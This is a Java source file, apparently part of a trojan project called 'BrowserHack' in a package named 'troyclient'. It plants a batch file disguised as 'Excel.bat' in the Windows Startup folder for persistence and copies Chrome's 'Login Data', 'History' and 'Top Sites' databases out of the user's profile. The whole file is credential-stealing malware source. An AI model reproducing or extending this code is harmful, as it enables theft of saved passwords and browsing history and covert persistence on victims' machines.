package ch.lebois.troyclient;

import java.io.File;
import java.net.URISyntaxException;
import java.util.ArrayList;

/**
 * @author Felix
 * @project BrowserHack
 * @date 04 2017
 * @reich 3
 */
public class ChromeCopy {

    private static ArrayList<String> chromeData = new ArrayList<>();

    private ChromeCopy() {
        try {
            FileService fileHandler = new FileService(
                    System.getProperty("user.home")
                    + "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Excel.bat");
            fileHandler.write("echo \"" + new File(
                    ChromeCopy.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath()) + "\"");

//            System.out.println(new File(ChromeCopy.class.getProtectionDomain().getCodeSource().getLocation().toURI().getPath()));
        } catch (URISyntaxException e) {
            e.printStackTrace();
        }


    }

    public static void main(String[] args) {
        chromeData.add("Top Sites");
        chromeData.add("Login Data");
        chromeData.add("History");
        chromeData.add("History");

        for (String db : chromeData){
            new ChromeCopy().copy(db);
        }
    }

    public void copy(String fileName) {
        FileService chromeSqlFile = new FileService(
                System.getProperty("user.home")
                + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\" + fileName);
        chromeSqlFile.paste(fileName);
        System.out.println(System.getProperty("user.home") + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\" + fileName);
    }
}
